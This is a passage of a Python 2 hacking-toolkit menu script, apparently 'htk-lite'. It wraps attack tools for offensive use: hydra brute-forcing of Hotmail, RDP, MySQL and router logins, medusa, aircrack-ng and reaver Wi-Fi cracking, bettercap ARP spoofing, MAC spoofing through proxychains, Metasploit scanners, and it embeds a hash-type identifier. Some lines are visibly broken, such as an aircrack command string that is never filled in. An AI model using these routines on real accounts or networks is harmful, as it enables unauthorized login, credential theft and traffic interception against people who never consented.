	  print "          +----------------------------+"
	  print "          |    Hotmail Brute Force     |"
	  print "          +----------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '10':
		print
		print "        +-----------------------------+"
		print "        |  Router Speedy Brute Force  |"
		print "        +-----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '11':
		print
		print "        +----------------------------+"
		print "        |      RDP Brute Force       |"
		print "        +----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '12':
		print
		print "        +-----------------------------+"
		print "        |       MySQL Brute Force     |"
		print "        +-----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
		
	elif bhydra == '00' or bhydra == '0':
		print "\n[!] Exit the Program..."
		sys.exit()
		
	else:
		print "\n[!] ERROR : Wrong Input"
		time.sleep(1)
	restart_program()

def medusa():
	k = raw_input("\033[1mHost:\033[0m ")
	u = raw_input("\033[1mUser:\033[0m ")
	p = raw_input("\033[1mWordlist:\033[0m ")
	os.system("medusa -d")
	print "\n"
	m = raw_input("\033[1mModule:\033[0m ")
	n = raw_input("\033[1mPort:\033[0m ")
	a = 'medusa -h {0} -u {1} -P {2} -M {3} -n {4}'.format(k,u,p,m,n)
	os.system(a)

def aircrack():
	b = raw_input(G+"\033[1mBSSID: \033[0m")
	e = raw_input(G+"\033[1mESSID: \033[0m")
	w = raw_input(G+"\033[1mWordlist: \033[0m")
	h = raw_input(G+"\033[1mHandshake file: \033[0m")
	os.system("iwconfig")
	i = raw_input(G+"\033[1mInterface: \033[0m")
	os.system("airmon-ng start " + i)
	a = 'aircrack-ng -b {0} -e {1} -w {2} {3} {4}'
	os.system(a)
	os.system("airmon-ng stop " + i)

def reaver():
	os.system("iwconfig")
	j = raw_input("\033[1mSelect Interface:\033[0m ")
	k = raw_input("\033[1mEnter BSSID:\033[0m ")
	a = 'reaver -i {0} -b {1} -vv'.format(j,k)
	os.system(a)

def password():
	print """
{0}1: gmail
{1}2: instagram
{2}3: facebook
{3}4: hydra
{4}5: medusa
{5}6: aircrack-ng
{6}7: reaver
\033[0m
go back: go to main menu
	""".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
	try:
		choice = raw_input("\033[1mAttack:\033[0m ")
		if choice == "1":
			gmail()
		if choice == "2":
			insta()
		if choice == "3":
			fb()
		if choice == "4":
			blackhydra()
		if choice == "5":
			medusa()
		if choice == "6":
			aircrack()
		if choice == "7":
			reaver()
		if choice == "go back":
			os.system("")

	except:
		print "\n"

def reboot():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def monitoron():
	os.system("iwconfig")
	i = raw_input("Select Interface: ")
	os.system("airmon-ng start " + i)
def monitoroff():
	os.system("iwconfig")
	i = raw_input("Select Interface: ")
	os.system("airmon-ng stop " + i)

def command():
	command = raw_input("\033[1mCommand:\033[0m ")
	os.system(command)

def anonon():
	print "\033[93m------------------------\033[0m"
	print "\nSTARTING MACCHANGER\n"
	print "\033[93m------------------------\033[0m"
	os.system("iwconfig")
	k = raw_input("Interface: ")
	c = 'ifconfig {0} down'.format(k)
	os.system(c)
	os.system("macchanger -r " + k)
	s = 'ifconfig {0} up'.format(k)
	os.system(s)
	show = 'macchanger -s {0}'.format(k)
	os.system(show)
	os.system('proxychains python /root/hackers-tool-kit/htk-lite/htkl.py --quickrun')


def anonoff():
	print "\033[93m------------------------\033[0m"
	print "\nSTOPPING MACCHANGER\n"
	print "\033[93m------------------------\033[0m"
	os.system("iwconfig")
	k = raw_input("Interface: ")
	c = 'ifconfig {0} down'.format(k)
	os.system(c)
	os.system("macchanger -p " + k)
	s = 'ifconfig {0} up'.format(k)
	os.system(s)
	sys.exit()
	reboot()

def sysinfo():
	os.system("iwconfig")
	k = raw_input("\033[1mInterface:\033[0m ")
	os.system("clear")
	os.system("ifconfig")
	print "\n"
	os.system("iwconfig")
	print "\n"
	os.system("neofetch")
	print "\n"
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	print (" IP: ", ipaddr, " Gateway: ", gateway, " Host: ", host)
	print "\n        Router IP"
	print "----------------------------\033[92m"
	os.system('curl "http://myexternalip.com/raw"')
	print "\n\033[0m----------------------------"
	print "\n"
	show = 'macchanger -s {0}'.format(k)
	os.system(show)
	os.system("uname -a")
	os.system("whoami")

def netscan():
	print """
{0}1: scan for devices in your network

{1}2: scan for networks around you
\033[0m
go back: go back to main menu
	""".format(random.choice(colorlist), random.choice(colorlist))
	try:
		choice = raw_input("\033[1mScan:\033[0m ")

		if choice == "1":
			os.system("netdiscover")
		if choice == "2":
			os.system("iwconfig")
			m = raw_input("\033[1mSelect Interface:\033[0m ")
			os.system("airmon-ng start " + m)
			print Y+"WOULD YOU LIKE TO SAVE YOUR SCAN RESULTS?\033[0m"
			j = raw_input("\033[1m[y/n]>\033[0m ")
			if j == "y":
				os.system("airodump-ng -w /root/SCAN " + m)
				print Y+"! SCAN RESULTS SAVED IN /root/ DIRECTORY !\033[0m"
			if j == "n":
				os.system("airodump-ng " + m)
			os.system("airmon-ng stop " + i)
		if choice == "go back":
			os.system("")
	except:
		print "\n"

def verscan():
	print """
Services available:

{0}ssh

{1}mysql
\033[0m
	""".format(random.choice(colorlist), random.choice(colorlist))
	try:
		service = raw_input("\033[1mService: \033[0m")
		if service == "ssh":
			f = raw_input(G+"\033[1mTarget: \033[0m")
			g = raw_input(G+"\033[1mPort: \033[0m")
			t = raw_input(G+"\033[1mThreads: \033[0m")
			b = raw_input(G+"\033[1mTimeout: \033[0m")
			os.system('echo "use auxiliary/scanner/ssh/ssh_version\n" >> sshver.rc')
			os.system('echo "set RHOSTS {0}\n" >> sshver.rc'.format(f))
			os.system('echo "set RPORT {0}\n" >> sshver.rc'.format(g))
			os.system('echo "set THREADS {0}\n" >> sshver.rc'.format(t))
			os.system('echo "set TIMEOUT {0}\n" >> sshver.rc'.format(b))
			os.system('echo "show options\n" >> sshver.rc')
			os.system('echo "run\n" >> sshver.rc')
			os.system('echo "exit\n" >> sshver.rc')
			os.system("service postgresql restart")
			os.system('msfconsole -q -r sshver.rc')
			os.system('rm -rf sshver.rc')

		if service == "mysql":
			f = raw_input(G+"\033[1mTarget: \033[0m")
			g = raw_input(G+"\033[1mPort: \033[0m")
			t = raw_input(G+"\033[1mThreads: \033[0m")
			os.system('echo "use auxiliary/scanner/mysql/mysql_version\n" >> mysqlv.rc')
			os.system('echo "set RHOSTS {0}\n" >> mysqlv.rc'.format(f))
			os.system('echo "set RPORT {0}\n" >> mysqlv.rc'.format(g))
			os.system('echo "set THREADS {0}\n" >> mysqlv.rc'.format(t))
			os.system('echo "show options\n" >> mysqlv.rc')
			os.system('echo "run\n" >> mysqlv.rc')
			os.system('echo "exit\n" >> mysqlv.rc')
			os.system("service postgresql restart")
			os.system('msfconsole -q -r mysqlv.rc')
			os.system('rm -rf mysqlv.rc')
	except:
		print "\n"

def wordlist():
	os.system("cd wordlists && cupp -i")
	print Y+"wordlist saved to /root/htk-lite/wordlists \033[0m"

def arpspoof():
	print "\033[93mif using multiple targets heres an example:	134.143.1.3, 134.143.1.6\033[0m\n"
	h = raw_input("\033[1mTarget/s:\033[0m ")
	os.system('echo "net.sniff on\n" >> arp.cap')
	os.system('echo "set arp.spoof.targets {0}\n" >> arp.cap'.format(h))
	os.system('echo "arp.spoof on\n" >> arp.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet arp.cap")
	os.system("rm arp.cap")

def traff():
	os.system("iwconfig")
	s = raw_input("\033[1mSelect Interface:\033[0m ")
	os.system("tcpdump -i " + s)

def hashid():
	try:
		#!/usr/bin/python
		# encoding: utf-8
		# Hash Identifier v1.1
		# By Zion3R
		# www.Blackploit.com
		# Root@Blackploit.com

		logo='''           #########################################################################
		   #	 __  __ 		    __		 ______    _____	   #
		   #	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #
		   #	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #
		   #	 \ \  _  \  /'__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #
		   #	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #
		   #	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #
		   #	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
		   #								 By Zion3R #
		   #							www.Blackploit.com #
		   #						       Root@Blackploit.com #
		   #########################################################################'''

		algorithms={"102020":"ADLER-32", "102040":"CRC-32", "102060":"CRC-32B", "101020":"CRC-16", "101040":"CRC-16-CCITT", "104020":"DES(Unix)", "101060":"FCS-16", "103040":"GHash-32-3", "103020":"GHash-32-5", "115060":"GOST R 34.11-94", "109100":"Haval-160", "109200":"Haval-160(HMAC)", "110040":"Haval-192", "110080":"Haval-192(HMAC)", "114040":"Haval-224", "114080":"Haval-224(HMAC)", "115040":"Haval-256", "115140":"Haval-256(HMAC)", "107080":"Lineage II C4", "106025":"Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))", "102080":"XOR-32", "105060":"MD5(Half)", "105040":"MD5(Middle)", "105020":"MySQL", "107040":"MD5(phpBB3)", "107060":"MD5(Unix)", "107020":"MD5(Wordpress)", "108020":"MD5(APR)", "106160":"Haval-128", "106165":"Haval-128(HMAC)", "106060":"MD2", "106120":"MD2(HMAC)", "106040":"MD4", "106100":"MD4(HMAC)", "106020":"MD5", "106080":"MD5(HMAC)", "106140":"MD5(HMAC(Wordpress))", "106029":"NTLM", "106027":"RAdmin v2.x", "106180":"RipeMD-128", "106185":"RipeMD-128(HMAC)", "106200":"SNEFRU-128", "106205":"SNEFRU-128(HMAC)", "106220":"Tiger-128", "106225":"Tiger-128(HMAC)", "106240":"md5($pass.$salt)", "106260":"md5($salt.'-'.md5($pass))", "106280":"md5($salt.$pass)", "106300":"md5($salt.$pass.$salt)", "106320":"md5($salt.$pass.$username)", "106340":"md5($salt.md5($pass))", "106360":"md5($salt.md5($pass).$salt)", "106380":"md5($salt.md5($pass.$salt))", "106400":"md5($salt.md5($salt.$pass))", "106420":"md5($salt.md5(md5($pass).$salt))", "106440":"md5($username.0.$pass)", "106460":"md5($username.LF.$pass)", "106480":"md5($username.md5($pass).$salt)", "106500":"md5(md5($pass))", "106520":"md5(md5($pass).$salt)", "106540":"md5(md5($pass).md5($salt))", "106560":"md5(md5($salt).$pass)", "106580":"md5(md5($salt).md5($pass))", "106600":"md5(md5($username.$pass).$salt)", "106620":"md5(md5(md5($pass)))", "106640":"md5(md5(md5(md5($pass))))", "106660":"md5(md5(md5(md5(md5($pass)))))", "106680":"md5(sha1($pass))", "106700":"md5(sha1(md5($pass)))", "106720":"md5(sha1(md5(sha1($pass))))", "106740":"md5(strtoupper(md5($pass)))", "109040":"MySQL5 - SHA-1(SHA-1($pass))", "109060":"MySQL 160bit - SHA-1(SHA-1($pass))", "109180":"RipeMD-160(HMAC)", "109120":"RipeMD-160", "109020":"SHA-1", "109140":"SHA-1(HMAC)", "109220":"SHA-1(MaNGOS)", "109240":"SHA-1(MaNGOS2)", "109080":"Tiger-160", "109160":"Tiger-160(HMAC)", "109260":"sha1($pass.$salt)", "109280":"sha1($salt.$pass)", "109300":"sha1($salt.md5($pass))", "109320":"sha1($salt.md5($pass).$salt)", "109340":"sha1($salt.sha1($pass))", "109360":"sha1($salt.sha1($salt.sha1($pass)))", "109380":"sha1($username.$pass)", "109400":"sha1($username.$pass.$salt)", "1094202":"sha1(md5($pass))", "109440":"sha1(md5($pass).$salt)", "109460":"sha1(md5(sha1($pass)))", "109480":"sha1(sha1($pass))", "109500":"sha1(sha1($pass).$salt)", "109520":"sha1(sha1($pass).substr($pass,0,3))", "109540":"sha1(sha1($salt.$pass))", "109560":"sha1(sha1(sha1($pass)))", "109580":"sha1(strtolower($username).$pass)", "110020":"Tiger-192", "110060":"Tiger-192(HMAC)", "112020":"md5($pass.$salt) - Joomla", "113020":"SHA-1(Django)", "114020":"SHA-224", "114060":"SHA-224(HMAC)", "115080":"RipeMD-256", "115160":"RipeMD-256(HMAC)", "115100":"SNEFRU-256", "115180":"SNEFRU-256(HMAC)", "115200":"SHA-256(md5($pass))", "115220":"SHA-256(sha1($pass))", "115020":"SHA-256", "115120":"SHA-256(HMAC)", "116020":"md5($pass.$salt) - Joomla", "116040":"SAM - (LM_hash:NT_hash)", "117020":"SHA-256(Django)", "118020":"RipeMD-320", "118040":"RipeMD-320(HMAC)", "119020":"SHA-384", "119040":"SHA-384(HMAC)", "120020":"SHA-256", "121020":"SHA-384(Django)", "122020":"SHA-512", "122060":"SHA-512(HMAC)", "122040":"Whirlpool", "122080":"Whirlpool(HMAC)"}

		# hash.islower()  minusculas
		# hash.isdigit()  numerico
		# hash.isalpha()  letras
		# hash.isalnum()  alfanumerico

		def CRC16():
		    hs='4607'
		    if len(hash)==len(hs) and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("101020")
		def CRC16CCITT():
		    hs='3d08'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("101040")
		def FCS16():
		    hs='0e5b'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("101060")

		def CRC32():
		    hs='b33fd057'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("102040")
		def ADLER32():
		    hs='0607cb42'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("102020")
		def CRC32B():
		    hs='b764a0d9'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("102060")
		def XOR32():
		    hs='0000003f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("102080")

		def GHash323():
		    hs='80000000'
		    if len(hash)==len(hs) and hash.isdigit()==True and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("103040")
		def GHash325():
		    hs='85318985'
		    if len(hash)==len(hs) and hash.isdigit()==True and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("103020")

		def DESUnix():
		    hs='ZiY8YtDKXJwYQ'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False:
			jerar.append("104020")

		def MD5Half():
		    hs='ae11fd697ec92c7c'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("105060")
		def MD5Middle():
		    hs='7ec92c7c98de3fac'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("105040")
		def MySQL():
		    hs='63cea4673fd25f46'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("105020")

		def DomainCachedCredentials():
		    hs='f42005ec1afe77967cbc83dce1b4d714'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106025")
		def Haval128():
		    hs='d6e3ec49aa0f138a619f27609022df10'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106160")
		def Haval128HMAC():
		    hs='3ce8b0ffd75bc240fc7d967729cd6637'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106165")
		def MD2():
		    hs='08bbef4754d98806c373f2cd7d9a43c4'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106060")
		def MD2HMAC():
		    hs='4b61b72ead2b0eb0fa3b8a56556a6dca'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106120")
		def MD4():
		    hs='a2acde400e61410e79dacbdfc3413151'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106040")
		def MD4HMAC():
		    hs='6be20b66f2211fe937294c1c95d1cd4f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106100")
		def MD5():
		    hs='ae11fd697ec92c7c98de3fac23aba525'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106020")
		def MD5HMAC():
		    hs='d57e43d2c7e397bf788f66541d6fdef9'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106080")
		def MD5HMACWordpress():
		    hs='3f47886719268dfa83468630948228f6'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106140")
		def NTLM():
		    hs='cc348bace876ea440a28ddaeb9fd3550'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106029")
		def RAdminv2x():
		    hs='baea31c728cbf0cd548476aa687add4b'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106027")
		def RipeMD128():
		    hs='4985351cd74aff0abc5a75a0c8a54115'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106180")
		def RipeMD128HMAC():
		    hs='ae1995b931cf4cbcf1ac6fbf1a83d1d3'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106185")
		def SNEFRU128():
		    hs='4fb58702b617ac4f7ca87ec77b93da8a'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106200")
		def SNEFRU128HMAC():
		    hs='59b2b9dcc7a9a7d089cecf1b83520350'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106205")
		def Tiger128():
		    hs='c086184486ec6388ff81ec9f23528727'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106220")
		def Tiger128HMAC():
		    hs='c87032009e7c4b2ea27eb6f99723454b'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106225")
		def md5passsalt():
		    hs='5634cc3b922578434d6e9342ff5913f7'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106240")
		def md5saltmd5pass():
		    hs='245c5763b95ba42d4b02d44bbcd916f1'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106260")
		def md5saltpass():
		    hs='22cc5ce1a1ef747cd3fa06106c148dfa'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106280")
		def md5saltpasssalt():
		    hs='469e9cdcaff745460595a7a386c4db0c'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106300")
		def md5saltpassusername():
		    hs='9ae20f88189f6e3a62711608ddb6f5fd'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106320")
		def md5saltmd5pass():
		    hs='aca2a052962b2564027ee62933d2382f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106340")
		def md5saltmd5passsalt():
		    hs='de0237dc03a8efdf6552fbe7788b2fdd'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106360")
		def md5saltmd5passsalt():
		    hs='5b8b12ca69d3e7b2a3e2308e7bef3e6f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106380")
		def md5saltmd5saltpass():
		    hs='d8f3b3f004d387086aae24326b575b23'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106400")
		def md5saltmd5md5passsalt():
		    hs='81f181454e23319779b03d74d062b1a2'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106420")
		def md5username0pass():
		    hs='e44a60f8f2106492ae16581c91edb3ba'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106440")
		def md5usernameLFpass():
		    hs='654741780db415732eaee12b1b909119'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106460")
		def md5usernamemd5passsalt():
		    hs='954ac5505fd1843bbb97d1b2cda0b98f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106480")
		def md5md5pass():
		    hs='a96103d267d024583d5565436e52dfb3'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106500")
		def md5md5passsalt():
		    hs='5848c73c2482d3c2c7b6af134ed8dd89'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106520")
		def md5md5passmd5salt():
		    hs='8dc71ef37197b2edba02d48c30217b32'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106540")
		def md5md5saltpass():
		    hs='9032fabd905e273b9ceb1e124631bd67'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106560")
		def md5md5saltmd5pass():
		    hs='8966f37dbb4aca377a71a9d3d09cd1ac'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106580")
		def md5md5usernamepasssalt():
		    hs='4319a3befce729b34c3105dbc29d0c40'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106600")
		def md5md5md5pass():
		    hs='ea086739755920e732d0f4d8c1b6ad8d'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106620")
		def md5md5md5md5pass():
		    hs='02528c1f2ed8ac7d83fe76f3cf1c133f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106640")
		def md5md5md5md5md5pass():
		    hs='4548d2c062933dff53928fd4ae427fc0'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106660")
		def md5sha1pass():
		    hs='cb4ebaaedfd536d965c452d9569a6b1e'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106680")
		def md5sha1md5pass():
		    hs='099b8a59795e07c334a696a10c0ebce0'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106700")
		def md5sha1md5sha1pass():
		    hs='06e4af76833da7cc138d90602ef80070'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106720")
		def md5strtouppermd5pass():
		    hs='519de146f1a658ab5e5e2aa9b7d2eec8'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("106740")

		def LineageIIC4():
		    hs='0x49a57f66bd3d5ba6abda5579c264a0e4'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True and hash[0:2].find('0x')==0:
			jerar.append("107080")
		def MD5phpBB3():
		    hs='$H$9kyOtE8CDqMJ44yfn9PFz2E.L2oVzL1'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$H$')==0:
			jerar.append("107040")
		def MD5Unix():
		    hs='$1$cTuJH0Ju$1J8rI.mJReeMvpKUZbSlY/'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$1$')==0:
			jerar.append("107060")
		def MD5Wordpress():
		    hs='$P$BiTOhOj3ukMgCci2juN0HRbCdDRqeh.'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$P$')==0:
			jerar.append("107020")

		def MD5APR():
		    hs='$apr1$qAUKoKlG$3LuCncByN76eLxZAh/Ldr1'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash[0:4].find('$apr')==0:
			jerar.append("108020")

		def Haval160():
		    hs='a106e921284dd69dad06192a4411ec32fce83dbb'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109100")
		def Haval160HMAC():
		    hs='29206f83edc1d6c3f680ff11276ec20642881243'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109200")
		def MySQL5():
		    hs='9bb2fb57063821c762cc009f7584ddae9da431ff'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109040")
		def MySQL160bit():
		    hs='*2470c0c06dee42fd1618bb99005adca2ec9d1e19'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:1].find('*')==0:
			jerar.append("109060")
		def RipeMD160():
		    hs='dc65552812c66997ea7320ddfb51f5625d74721b'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109120")
		def RipeMD160HMAC():
		    hs='ca28af47653b4f21e96c1235984cb50229331359'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109180")
		def SHA1():
		    hs='4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109020")
		def SHA1HMAC():
		    hs='6f5daac3fee96ba1382a09b1ba326ca73dccf9e7'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109140")
		def SHA1MaNGOS():
		    hs='a2c0cdb6d1ebd1b9f85c6e25e0f8732e88f02f96'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109220")
		def SHA1MaNGOS2():
		    hs='644a29679136e09d0bd99dfd9e8c5be84108b5fd'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109240")
		def Tiger160():
		    hs='c086184486ec6388ff81ec9f235287270429b225'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109080")
		def Tiger160HMAC():
		    hs='6603161719da5e56e1866e4f61f79496334e6a10'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109160")
		def sha1passsalt():
		    hs='f006a1863663c21c541c8d600355abfeeaadb5e4'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109260")
		def sha1saltpass():
		    hs='299c3d65a0dcab1fc38421783d64d0ecf4113448'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109280")
		def sha1saltmd5pass():
		    hs='860465ede0625deebb4fbbedcb0db9dc65faec30'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109300")
		def sha1saltmd5passsalt():
		    hs='6716d047c98c25a9c2cc54ee6134c73e6315a0ff'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109320")
		def sha1saltsha1pass():
		    hs='58714327f9407097c64032a2fd5bff3a260cb85f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109340")
		def sha1saltsha1saltsha1pass():
		    hs='cc600a2903130c945aa178396910135cc7f93c63'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109360")
		def sha1usernamepass():
		    hs='3de3d8093bf04b8eb5f595bc2da3f37358522c9f'
